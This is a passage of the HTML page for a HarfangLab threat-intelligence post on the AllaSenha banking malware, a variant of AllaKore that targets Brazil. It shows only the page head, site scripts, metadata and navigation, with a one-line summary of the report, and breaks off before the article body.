<!DOCTYPE html>
<html lang="en-US" class="no-js ">
<head><meta charset="UTF-8"><script>if(navigator.userAgent.match(/MSIE|Internet Explorer/i)||navigator.userAgent.match(/Trident\/7\..*?rv:11/i)){var href=document.location.href;if(!href.match(/[?&]nowprocket/)){if(href.indexOf("?")==-1){if(href.indexOf("#")==-1){document.location.href=href+"?nowprocket=1"}else{document.location.href=href.replace("#","?nowprocket=1#")}}else{if(href.indexOf("#")==-1){document.location.href=href+"&nowprocket=1"}else{document.location.href=href.replace("#","&nowprocket=1#")}}}}</script><script>(()=>{class RocketLazyLoadScripts{constructor(){this.v="1.2.6",this.triggerEvents=["keydown","mousedown","mousemove","touchmove","touchstart","touchend","wheel"],this.userEventHandler=this.t.bind(this),this.touchStartHandler=this.i.bind(this),this.touchMoveHandler=this.o.bind(this),this.touchEndHandler=this.h.bind(this),this.clickHandler=this.u.bind(this),this.interceptedClicks=[],this.interceptedClickListeners=[],this.l(this),window.addEventListener("pageshow",(t=>{this.persisted=t.persisted,this.everythingLoaded&&this.m()})),this.CSPIssue=sessionStorage.getItem("rocketCSPIssue"),document.addEventListener("securitypolicyviolation",(t=>{this.CSPIssue||"script-src-elem"!==t.violatedDirective||"data"!==t.blockedURI||(this.CSPIssue=!0,sessionStorage.setItem("rocketCSPIssue",!0))})),document.addEventListener("DOMContentLoaded",(()=>{this.k()})),this.delayedScripts={normal:[],async:[],defer:[]},this.trash=[],this.allJQueries=[]}p(t){document.hidden?t.t():(this.triggerEvents.forEach((e=>window.addEventListener(e,t.userEventHandler,{passive:!0}))),window.addEventListener("touchstart",t.touchStartHandler,{passive:!0}),window.addEventListener("mousedown",t.touchStartHandler),document.addEventListener("visibilitychange",t.userEventHandler))}_(){this.triggerEvents.forEach((t=>window.removeEventListener(t,this.userEventHandler,{passive:!0}))),document.removeEventListener("visibilitychange",this.userEventHandler)}i(t){"HTML"!==t.target.tagName&&(window.addEventListener("touchend",this.touchEndHandler),window.addEventListener("mouseup",this.touchEndHandler),window.addEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.addEventListener("mousemove",this.touchMoveHandler),t.target.addEventListener("click",this.clickHandler),this.L(t.target,!0),this.S(t.target,"onclick","rocket-onclick"),this.C())}o(t){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler),t.target.removeEventListener("click",this.clickHandler),this.L(t.target,!1),this.S(t.target,"rocket-onclick","onclick"),this.M()}h(){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler)}u(t){t.target.removeEventListener("click",this.clickHandler),this.L(t.target,!1),this.S(t.target,"rocket-onclick","onclick"),this.interceptedClicks.push(t),t.preventDefault(),t.stopPropagation(),t.stopImmediatePropagation(),this.M()}O(){window.removeEventListener("touchstart",this.touchStartHandler,{passive:!0}),window.removeEventListener("mousedown",this.touchStartHandler),this.interceptedClicks.forEach((t=>{t.target.dispatchEvent(new MouseEvent("click",{view:t.view,bubbles:!0,cancelable:!0}))}))}l(t){EventTarget.prototype.addEventListenerWPRocketBase=EventTarget.prototype.addEventListener,EventTarget.prototype.addEventListener=function(e,i,o){"click"!==e||t.windowLoaded||i===t.clickHandler||t.interceptedClickListeners.push({target:this,func:i,options:o}),(this||window).addEventListenerWPRocketBase(e,i,o)}}L(t,e){this.interceptedClickListeners.forEach((i=>{i.target===t&&(e?t.removeEventListener("click",i.func,i.options):t.addEventListener("click",i.func,i.options))})),t.parentNode!==document.documentElement&&this.L(t.parentNode,e)}D(){return new Promise((t=>{this.P?this.M=t:t()}))}C(){this.P=!0}M(){this.P=!1}S(t,e,i){t.hasAttribute&&t.hasAttribute(e)&&(event.target.setAttribute(i,event.target.getAttribute(e)),event.target.removeAttribute(e))}t(){this._(this),"loading"===document.readyState?document.addEventListener("DOMContentLoaded",this.R.bind(this)):this.R()}k(){let t=[];document.querySelectorAll("script[type=rocketlazyloadscript][data-rocket-src]").forEach((e=>{let i=e.getAttribute("data-rocket-src");if(i&&!i.startsWith("data:")){0===i.indexOf("//")&&(i=location.protocol+i);try{const o=new URL(i).origin;o!==location.origin&&t.push({src:o,crossOrigin:e.crossOrigin||"module"===e.getAttribute("data-rocket-type")})}catch(t){}}})),t=[...new Map(t.map((t=>[JSON.stringify(t),t]))).values()],this.T(t,"preconnect")}async R(){this.lastBreath=Date.now(),this.j(this),this.F(this),this.I(),this.W(),this.q(),await this.A(this.delayedScripts.normal),await this.A(this.delayedScripts.defer),await this.A(this.delayedScripts.async);try{await this.U(),await this.H(this),await this.J()}catch(t){console.error(t)}window.dispatchEvent(new Event("rocket-allScriptsLoaded")),this.everythingLoaded=!0,this.D().then((()=>{this.O()})),this.N()}W(){document.querySelectorAll("script[type=rocketlazyloadscript]").forEach((t=>{t.hasAttribute("data-rocket-src")?t.hasAttribute("async")&&!1!==t.async?this.delayedScripts.async.push(t):t.hasAttribute("defer")&&!1!==t.defer||"module"===t.getAttribute("data-rocket-type")?this.delayedScripts.defer.push(t):this.delayedScripts.normal.push(t):this.delayedScripts.normal.push(t)}))}async B(t){if(await this.G(),!0!==t.noModule||!("noModule"in HTMLScriptElement.prototype))return new Promise((e=>{let i;function o(){(i||t).setAttribute("data-rocket-status","executed"),e()}try{if(navigator.userAgent.indexOf("Firefox/")>0||""===navigator.vendor||this.CSPIssue)i=document.createElement("script"),[...t.attributes].forEach((t=>{let e=t.nodeName;"type"!==e&&("data-rocket-type"===e&&(e="type"),"data-rocket-src"===e&&(e="src"),i.setAttribute(e,t.nodeValue))})),t.text&&(i.text=t.text),i.hasAttribute("src")?(i.addEventListener("load",o),i.addEventListener("error",(function(){i.setAttribute("data-rocket-status","failed-network"),e()})),setTimeout((()=>{i.isConnected||e()}),1)):(i.text=t.text,o()),t.parentNode.replaceChild(i,t);else{const i=t.getAttribute("data-rocket-type"),s=t.getAttribute("data-rocket-src");i?(t.type=i,t.removeAttribute("data-rocket-type")):t.removeAttribute("type"),t.addEventListener("load",o),t.addEventListener("error",(i=>{this.CSPIssue&&i.target.src.startsWith("data:")?(console.log("WPRocket: data-uri blocked by CSP -> fallback"),t.removeAttribute("src"),this.B(t).then(e)):(t.setAttribute("data-rocket-status","failed-network"),e())})),s?(t.removeAttribute("data-rocket-src"),t.src=s):t.src="data:text/javascript;base64,"+window.btoa(unescape(encodeURIComponent(t.text)))}}catch(i){t.setAttribute("data-rocket-status","failed-transform"),e()}}));t.setAttribute("data-rocket-status","skipped")}async A(t){const e=t.shift();return e&&e.isConnected?(await this.B(e),this.A(t)):Promise.resolve()}q(){this.T([...this.delayedScripts.normal,...this.delayedScripts.defer,...this.delayedScripts.async],"preload")}T(t,e){var i=document.createDocumentFragment();t.forEach((t=>{const o=t.getAttribute&&t.getAttribute("data-rocket-src")||t.src;if(o&&!o.startsWith("data:")){const s=document.createElement("link");s.href=o,s.rel=e,"preconnect"!==e&&(s.as="script"),t.getAttribute&&"module"===t.getAttribute("data-rocket-type")&&(s.crossOrigin=!0),t.crossOrigin&&(s.crossOrigin=t.crossOrigin),t.integrity&&(s.integrity=t.integrity),i.appendChild(s),this.trash.push(s)}})),document.head.appendChild(i)}j(t){let e={};function i(i,o){return e[o].eventsToRewrite.indexOf(i)>=0&&!t.everythingLoaded?"rocket-"+i:i}function o(t,o){!function(t){e[t]||(e[t]={originalFunctions:{add:t.addEventListener,remove:t.removeEventListener},eventsToRewrite:[]},t.addEventListener=function(){arguments[0]=i(arguments[0],t),e[t].originalFunctions.add.apply(t,arguments)},t.removeEventListener=function(){arguments[0]=i(arguments[0],t),e[t].originalFunctions.remove.apply(t,arguments)})}(t),e[t].eventsToRewrite.push(o)}function s(e,i){let o=e[i];e[i]=null,Object.defineProperty(e,i,{get:()=>o||function(){},set(s){t.everythingLoaded?o=s:e["rocket"+i]=o=s}})}o(document,"DOMContentLoaded"),o(window,"DOMContentLoaded"),o(window,"load"),o(window,"pageshow"),o(document,"readystatechange"),s(document,"onreadystatechange"),s(window,"onload"),s(window,"onpageshow");try{Object.defineProperty(document,"readyState",{get:()=>t.rocketReadyState,set(e){t.rocketReadyState=e},configurable:!0}),document.readyState="loading"}catch(t){console.log("WPRocket DJE readyState conflict, bypassing")}}F(t){let e;function i(e){return t.everythingLoaded?e:e.split(" ").map((t=>"load"===t||0===t.indexOf("load.")?"rocket-jquery-load":t)).join(" ")}function o(o){function s(t){const e=o.fn[t];o.fn[t]=o.fn.init.prototype[t]=function(){return this[0]===window&&("string"==typeof arguments[0]||arguments[0]instanceof String?arguments[0]=i(arguments[0]):"object"==typeof arguments[0]&&Object.keys(arguments[0]).forEach((t=>{const e=arguments[0][t];delete arguments[0][t],arguments[0][i(t)]=e}))),e.apply(this,arguments),this}}o&&o.fn&&!t.allJQueries.includes(o)&&(o.fn.ready=o.fn.init.prototype.ready=function(e){return t.domReadyFired?e.bind(document)(o):document.addEventListener("rocket-DOMContentLoaded",(()=>e.bind(document)(o))),o([])},s("on"),s("one"),t.allJQueries.push(o)),e=o}o(window.jQuery),Object.defineProperty(window,"jQuery",{get:()=>e,set(t){o(t)}})}async H(t){const e=document.querySelector("script[data-webpack]");e&&(await async function(){return new Promise((t=>{e.addEventListener("load",t),e.addEventListener("error",t)}))}(),await t.K(),await t.H(t))}async U(){this.domReadyFired=!0;try{document.readyState="interactive"}catch(t){}await this.G(),document.dispatchEvent(new Event("rocket-readystatechange")),await this.G(),document.rocketonreadystatechange&&document.rocketonreadystatechange(),await this.G(),document.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this.G(),window.dispatchEvent(new Event("rocket-DOMContentLoaded"))}async J(){try{document.readyState="complete"}catch(t){}await this.G(),document.dispatchEvent(new Event("rocket-readystatechange")),await this.G(),document.rocketonreadystatechange&&document.rocketonreadystatechange(),await this.G(),window.dispatchEvent(new Event("rocket-load")),await this.G(),window.rocketonload&&window.rocketonload(),await this.G(),this.allJQueries.forEach((t=>t(window).trigger("rocket-jquery-load"))),await this.G();const t=new Event("rocket-pageshow");t.persisted=this.persisted,window.dispatchEvent(t),await this.G(),window.rocketonpageshow&&window.rocketonpageshow({persisted:this.persisted}),this.windowLoaded=!0}m(){document.onreadystatechange&&document.onreadystatechange(),window.onload&&window.onload(),window.onpageshow&&window.onpageshow({persisted:this.persisted})}I(){const t=new Map;document.write=document.writeln=function(e){const i=document.currentScript;i||console.error("WPRocket unable to document.write this: "+e);const o=document.createRange(),s=i.parentElement;let n=t.get(i);void 0===n&&(n=i.nextSibling,t.set(i,n));const c=document.createDocumentFragment();o.setStart(c,0),c.appendChild(o.createContextualFragment(e)),s.insertBefore(c,n)}}async G(){Date.now()-this.lastBreath>45&&(await this.K(),this.lastBreath=Date.now())}async K(){return document.hidden?new Promise((t=>setTimeout(t))):new Promise((t=>requestAnimationFrame(t)))}N(){this.trash.forEach((t=>t.remove()))}static run(){const t=new RocketLazyLoadScripts;t.p(t)}}RocketLazyLoadScripts.run()})();</script>
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<script>
var gform;gform||(document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0}),gform={domLoaded:!1,scriptsLoaded:!1,initializeOnLoaded:function(o){gform.domLoaded&&gform.scriptsLoaded?o():!gform.domLoaded&&gform.scriptsLoaded?window.addEventListener("DOMContentLoaded",o):document.addEventListener("gform_main_scripts_loaded",o)},hooks:{action:{},filter:{}},addAction:function(o,n,r,t){gform.addHook("action",o,n,r,t)},addFilter:function(o,n,r,t){gform.addHook("filter",o,n,r,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,n){gform.removeHook("action",o,n)},removeFilter:function(o,n,r){gform.removeHook("filter",o,n,r)},addHook:function(o,n,r,t,i){null==gform.hooks[o][n]&&(gform.hooks[o][n]=[]);var e=gform.hooks[o][n];null==i&&(i=n+"_"+e.length),gform.hooks[o][n].push({tag:i,callable:r,priority:t=null==t?10:t})},doHook:function(n,o,r){var t;if(r=Array.prototype.slice.call(r,1),null!=gform.hooks[n][o]&&((o=gform.hooks[n][o]).sort(function(o,n){return o.priority-n.priority}),o.forEach(function(o){"function"!=typeof(t=o.callable)&&(t=window[t]),"action"==n?t.apply(null,r):r[0]=t.apply(null,r)})),"filter"==n)return r[0]},removeHook:function(o,n,t,i){var r;null!=gform.hooks[o][n]&&(r=(r=gform.hooks[o][n]).filter(function(o,n,r){return!!(null!=i&&i!=o.tag||null!=t&&t!=o.priority)}),gform.hooks[o][n]=r)}});
</script>

	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
	<meta name="format-detection" content="telephone=no">
	<script type="rocketlazyloadscript">document.documentElement.className = document.documentElement.className.replace("no-js","js");</script>
	
	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<link rel="alternate" hreflang="en" href="https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/" />
<link rel="alternate" hreflang="x-default" href="https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/" />
<link rel="shortcut icon" type="image/x-icon" href="https://harfanglab.io/files/themes/harfangLab/assets/images/favicons/harfanglab.ico" />
<link rel="shortcut icon" type="image/png" href="https://harfanglab.io/files/themes/harfangLab/assets/images/favicons/harfanglab.png" />
<link rel="icon" type="image/x-icon" href="https://harfanglab.io/files/themes/harfangLab/assets/images/favicons/harfanglab.ico" />

	<!-- This site is optimized with the Yoast SEO Premium plugin v23.4 (Yoast SEO v23.4) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America</title>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/font/webfonts/basementgrotesqueblack-webfont.woff" crossorigin>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/font/webfonts/prestigeelitestd-bd-webfont.woff" crossorigin>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/font/webfonts/prestigeelitestd-webfont.woff" crossorigin>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/font/webfonts/proximanovabold-webfont.woff" crossorigin>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/font/webfonts/proximanovaregular-webfont.woff" crossorigin>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/font/webfonts/helveticaneue-webfont.woff" crossorigin>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/icons/harfanglab.woff" crossorigin>
<link rel="preload" as="font" href="https://harfanglab.io/files/themes/harfangLab/assets/fonts/icons/harfanglab.ttf" crossorigin>
	<link rel="canonical" href="https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America" />
	<meta property="og:description" content="Identifier: TRR240501. Summary Earlier in May, our security product spotted a malicious payload, which was tentatively delivered to a computer in Brazil, via an intricate infection chain involving Python scripts and a Delphi-developed loader. The final malicious payload, that we named &#8220;AllaSenha&#8221;, is specifically aimed at stealing credentials that are required to access Brazilian bank [&hellip;]" />
	<meta property="og:url" content="https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/" />
	<meta property="og:site_name" content="HarfangLab | Your endpoints, our protection" />
	<meta property="article:modified_time" content="2024-10-11T09:43:29+00:00" />
	<meta property="og:image" content="https://harfanglab.io/medias/2024/05/image.png" />
	<meta property="og:image:width" content="1024" />
	<meta property="og:image:height" content="574" />
	<meta property="og:image:type" content="image/png" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:site" content="@harfanglab" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/","url":"https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/","name":"AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America","isPartOf":{"@id":"https://harfanglab.io/#website"},"primaryImageOfPage":{"@id":"https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/#primaryimage"},"image":{"@id":"https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/#primaryimage"},"thumbnailUrl":"https://harfanglab.io/medias/2024/05/image.png","datePublished":"2024-05-28T14:36:48+00:00","dateModified":"2024-10-11T09:43:29+00:00","breadcrumb":{"@id":"https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/#primaryimage","url":"https://harfanglab.io/medias/2024/05/image.png","contentUrl":"https://harfanglab.io/medias/2024/05/image.png","width":1456,"height":816},{"@type":"BreadcrumbList","@id":"https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://harfanglab.io/"},{"@type":"ListItem","position":2,"name":"Inside","item":"https://harfanglab.io/insidethelab/"},{"@type":"ListItem","position":3,"name":"AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America"}]},{"@type":"WebSite","@id":"https://harfanglab.io/#website","url":"https://harfanglab.io/","name":"HarfangLab","description":"Empower your analysts, overcome the threats","publisher":{"@id":"https://harfanglab.io/#organization"},"alternateName":"HarfangLab","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://harfanglab.io/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://harfanglab.io/#organization","name":"HarfangLab","alternateName":"harfangLab","url":"https://harfanglab.io/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://harfanglab.io/#/schema/logo/image/","url":"https://harfanglab.io/medias/2023/09/logo-harfanglab-1.svg","contentUrl":"https://harfanglab.io/medias/2023/09/logo-harfanglab-1.svg","width":650,"height":187,"caption":"HarfangLab"},"image":{"@id":"https://harfanglab.io/#/schema/logo/image/"},"sameAs":["https://x.com/harfanglab","https://www.linkedin.com/company/harfanglab"]}]}</script>
	<!-- / Yoast SEO Premium plugin. -->


<link rel='dns-prefetch' href='//js.chilipiper.com' />

<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<link rel='stylesheet' id='harfanglab-styles-css' href='https://harfanglab.io/files/themes/harfangLab/assets/css/styles.min.css?ver=1.5.4' media='all' />
<style id='rocket-lazyload-inline-css'>
.rll-youtube-player{position:relative;padding-bottom:56.23%;height:0;overflow:hidden;max-width:100%;}.rll-youtube-player:focus-within{outline: 2px solid currentColor;outline-offset: 5px;}.rll-youtube-player iframe{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100;background:0 0}.rll-youtube-player img{bottom:0;display:block;left:0;margin:auto;max-width:100%;width:100%;position:absolute;right:0;top:0;border:none;height:auto;-webkit-transition:.4s all;-moz-transition:.4s all;transition:.4s all}.rll-youtube-player img:hover{-webkit-filter:brightness(75%)}.rll-youtube-player .play{height:100%;width:100%;left:0;top:0;position:absolute;background:url(/files/plugins/wp-rocket/assets/img/youtube.png) no-repeat center;background-color: transparent !important;cursor:pointer;border:none;}
</style>
<script id="wpml-cookie-js-extra">
var wpml_cookies = {"wp-wpml_current_language":{"value":"en","expires":1,"path":"\/"}};
var wpml_cookies = {"wp-wpml_current_language":{"value":"en","expires":1,"path":"\/"}};
</script>
<script type="rocketlazyloadscript" data-rocket-src="/files/plugins/sitepress-multilingual-cms/res/js/cookies/language-cookie.js?ver=4.6.13" id="wpml-cookie-js" defer data-wp-strategy="defer"></script>
<script type="rocketlazyloadscript" data-rocket-src="https://js.chilipiper.com/marketing.js?ver=1.5.4" id="chilipiper-js" data-rocket-defer defer></script>
<script src="https://harfanglab.io/files/themes/harfangLab/assets/js/init.min.js?ver=1.5.4" id="jquery-js"></script>
<meta name="generator" content="WPML ver:4.6.13 stt:1,4,3;" />
<link rel="icon" href="https://harfanglab.io/medias/2024/09/cropped-square-company-32x32.png" sizes="32x32" />
<link rel="icon" href="https://harfanglab.io/medias/2024/09/cropped-square-company-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://harfanglab.io/medias/2024/09/cropped-square-company-180x180.png" />
<meta name="msapplication-TileImage" content="https://harfanglab.io/medias/2024/09/cropped-square-company-270x270.png" />
<noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript>
	<script type="rocketlazyloadscript" data-rocket-type="text/javascript"><!-- Hotjar Tracking Code for https://www.harfanglab.io --> <script>     (function(h,o,t,j,a,r){         h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};         h._hjSettings={hjid:3792786,hjsv:6};         a=o.getElementsByTagName('head')[0];         r=o.createElement('script');r.async=1;         r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;         a.appendChild(r);     })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv='); </script></script></head>
<body class="inside-template-default single single-inside postid-103372 " >
			<div class="progress fixed-top js_scrollProgress">
		<div class="progress-bar" role="progressbar" aria-label="progressbar" style="0" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
	</div>
		<div id="main-wrapper">
		<header id="main-header" class="sticky">
			<nav id="main-top" class="navbar navbar-top">
				<div class="container">
					<a href="https://harfanglab.io/" class="navbar-brand">
						<img src="https://harfanglab.io/files/themes/harfangLab/assets/images/svg/logo-harfanglab.svg" alt="HarfangLab | Your endpoints, our protection" class="no-lazy img-fluid" width="225" height="65">
					</a>
				</div>
			</nav>
			<nav id="main-navbar" class="navbar navbar-expand-lg not-sticky">
				<div class="border-decoration"></div>
				<div class="container">
					<a href="https://harfanglab.io/" class="navbar-brand">
						<img src="https://harfanglab.io/files/themes/harfangLab/assets/images/svg/logo-harfanglab.svg" alt="HarfangLab | Your endpoints, our protection" class="no-lazy img-fluid" width="225" height="65">
					</a>
					<button type="button" data-bs-toggle="offcanvas" data-bs-target="#navOffcanvas" class="navbar-toggler collapsed">
    <div class="icons">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
    </div>
    <span class="visually-hidden-focusable label">
        <span>Menu</span>
        <span class="status">
            <span class="closed">Open</span>
            <span class="opened">Close</span>
        </span>
    </span>
</button>										<section id="navOffcanvas" class="navbar-collapse collapse js_navOffcanvas" tabindex="-1" data-bs-scroll="false" data-bs-backdrop="false">
						<div class="wrapper">
						<a href="https://harfanglab.io/" class="navbar-brand navbar-brand--mobile">
							<img src="https://harfanglab.io/files/themes/harfangLab/assets/images/svg/logo-harfanglab-mobile.svg" alt="HarfangLab | Your endpoints, our protection" class="no-lazy img-fluid" width="225" height="65">
						</a>
						<ul id="menu-main-menu-anglais" class="navbar-nav"><li id="menu-item-128780" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-128780"><a href="https://harfanglab.io/connectors/"><div class="menu-item-wrapper"><span class="menu-item-name">Solutions</span></div></a>
<ul class="sub-menu">
	<li id="menu-item-129366" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-129366"><a href="https://harfanglab.io/edr/"><div class="menu-item-wrapper"><span class="menu-item-name">EDR</span></div></a></li>
	<li id="menu-item-129365" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-129365"><a href="https://harfanglab.io/epp/"><div class="menu-item-wrapper"><span class="menu-item-name">EPP</span></div></a></li>
	<li id="menu-item-128781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-128781"><a href="https://harfanglab.io/connectors/"><div class="menu-item-wrapper"><span class="menu-item-name">Connectors</span></div></a></li>
</ul>
</li>
<li id="menu-item-129367" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-129367"><a href="https://harfanglab.io/plans/"><div class="menu-item-wrapper"><span class="menu-item-name">Plans</span></div></a></li>
<li id="menu-item-127507" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-127507"><a href="https://harfanglab.io/cybersecurity-case-studies/"><div class="menu-item-wrapper"><span class="menu-item-name">Case Studies</span></div></a></li>
<li id="menu-item-24691" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24691"><a href="https://harfanglab.io/partners/"><div class="menu-item-wrapper"><span class="menu-item-name">Partners</span></div></a></li>
<li id="menu-item-24692" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-has-children menu-item-24692"><a href="https://harfanglab.io/blog/"><div class="menu-item-wrapper"><span class="menu-item-name">Resources</span></div></a>
<ul class="sub-menu">
	<li id="menu-item-24693" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-24693"><a href="https://harfanglab.io/blog/"><div class="menu-item-wrapper"><span class="menu-item-name">HarfangLab – The Blog</span></div></a></li>
	<li id="menu-item-24694" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24694"><a href="https://harfanglab.io/insidethelab/"><div class="menu-item-wrapper"><span class="menu-item-name">Inside The Lab – The blog</span></div></a></li>
	<li id="menu-item-130132" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-130132"><a href="https://harfanglab.io/edr-mitre/"><div class="menu-item-wrapper"><span class="menu-item-name">EDR &#038; MITRE ATT&#038;CK</span></div></a></li>
	<li id="menu-item-130135" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-130135"><a href="https://harfanglab.io/cyber-attacks-types/"><div class="menu-item-wrapper"><span class="menu-item-name">Types of cyber attacks</span></div></a></li>
</ul>
</li>
</ul><ul id="menu-aside-menu-anglais" class="navbar-nav"><li id="menu-item-24696" class="btn-highlighted menu-item menu-item-type-post_type menu-item-object-page menu-item-24696"><a href="https://harfanglab.io/ask-demo/"><div class="menu-item-wrapper"><span class="menu-item-name">Request a demo</span></div><strong class="decoration-arrow-btn"><i  class="icon icon-arrow-btn"></i></strong></a></li>
</ul>						<nav class="socials">
    <p>Follow us on :</p>
    <ul>
            <li>
            <a href="https://x.com/harfanglab" class="social --twitter" target="_blank" rel="noreferrer" aria-label="twitter">
                <i class="social-icon-twitter icon-twitter">twitter</i>    
            </a>
        </li>
            <li>
            <a href="https://www.linkedin.com/company/harfanglab" class="social --linkedin" target="_blank" rel="noreferrer" aria-label="linkedin">
                <i class="social-icon-linkedin icon-linkedin">linkedin</i>    
            </a>
        </li>
        </ul>
</nav>
						</div>
					</section>
									</div>
			</nav>
		</header>
		<!-- <aside class="languages-selector languages-count-3">
    <div class="switch">
                    <a href="https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/" class="language active" title="English">
                <span>en</span>
            </a>
                    <a href="https://harfanglab.io/fr/" class="language " title="Français">
                <span>fr</span>
            </a>
                    <a href="https://harfanglab.io/de/" class="language " title="Deutsch">
                <span>de</span>
            </a>
          	</div>
</aside>
 -->

<aside class="languages-selector languages-count-3">
    <a href="https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/" class="language active" title="English"><span>en</span></a>    <div class="switch">
              </div>
</aside>

		<!-- /header#main-header -->
		<main id="main-content" role="main">
		<section id="main-hero" class="page-part page-part--hero --single --single--inside --has-illustration js_ScrollVisibility">
    <div class="inner">
        <div class="inner-pattern">
            <div class="container">
                <div class="wrapper">
                    <div class="card-decoration">
                        <span class="arrow-section">
                            <i class="arrow-big"></i>
                            <i class="arrow-big"></i>
                            <i class="arrow-big large"></i>
                        </span>
                        <span class="arrow-section arrow-section--reverse">
                            <i class="arrow-big large"></i>
                            <i class="arrow-big"></i>
                            <i class="arrow-big"></i>
                        </span>
                    </div>
                    <section class="hero-body  card--color-purple">
                        <a href="https://harfanglab.io/insidethelab/" class="archive--link archive-inside--link">
                <img width="202" height="99" src="https://harfanglab.io/medias/2023/12/logo_itb_purple.svg" alt="">
            </a>
            <!-- <span class="badge-group badge-group--lg"> -->
                                    <span class="badge-group badge-group--lg category--cyber-threat-intelligence-en">
                    CYBER THREAT INTELLIGENCE                </span>
                        <!-- </span> -->
                <h1 class="hero-title">AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America</h1>    
        <section class="hero-details">
        <div class="single-dates">
            <time class="single-date single-date--published" datetime="2024-05-28T16:36:48+02:00" itemprop="datePublished">
                Published on 28 May, 2024            </time>
            <span class="badge-group-item">
                 29 min            </span>
        </div>
    </section>
    </section>

<figure class="hero-featured">
    
			<picture class="no-lazy img-fluid full featured-picture">
											<source srcset="https://harfanglab.io/medias/2024/05/image-480x269.png 1x ,https://harfanglab.io/medias/2024/05/image-960x538.png 2x " 
				width="480" height="269"
